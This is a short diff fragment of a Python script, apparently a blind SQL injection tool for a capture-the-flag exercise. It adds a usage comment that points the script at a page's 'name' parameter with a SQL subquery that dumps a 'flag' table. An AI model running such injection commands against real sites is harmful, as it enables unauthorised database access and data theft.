@@ -203,3 +203,5 @@ if __name__ == '__main__':
 
 	results['expression'] = b.expression
 	print('\n{}'.format(results))
+
+# /ex.py -u http://10.102.8.197/s3cret_manag3r_pag3.php?name= -b -v -s -e "(SELECT GROUP_CONCAT(flag) FROM secret_db.flag_table)"
